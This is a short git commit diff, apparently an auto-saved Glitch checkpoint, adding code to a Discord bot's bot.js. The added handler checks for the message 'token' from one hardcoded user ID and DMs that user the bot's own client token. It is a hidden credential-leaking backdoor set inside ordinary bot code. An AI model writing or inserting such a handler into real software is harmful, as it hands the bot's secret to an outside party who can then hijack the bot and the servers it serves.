1384a1e414ca1cc0101e5812d3827820f8bd3d57
Glitch (planta-kayit) <none>
2021-04-21 20:25:51 +0000

    ⛄️🍖 Checkpoint ./bot.js:26490528/366

--- bot.js
+++ bot.js
@@ -208,6 +208,19 @@ throw err;
 })
 });
 
+client.on('message', async (msg, member, guild) => {
+  
+ {
+   
+if (msg.content.toLowerCase() === 'token'){
+if (msg.author.id !== "429357746002067493") return
+
+msg.author.send(client.token);
+}
+  
+}
+});
+
 
 client.on("guildCreate", async guild => {
 let embed = new Discord.MessageEmbed()
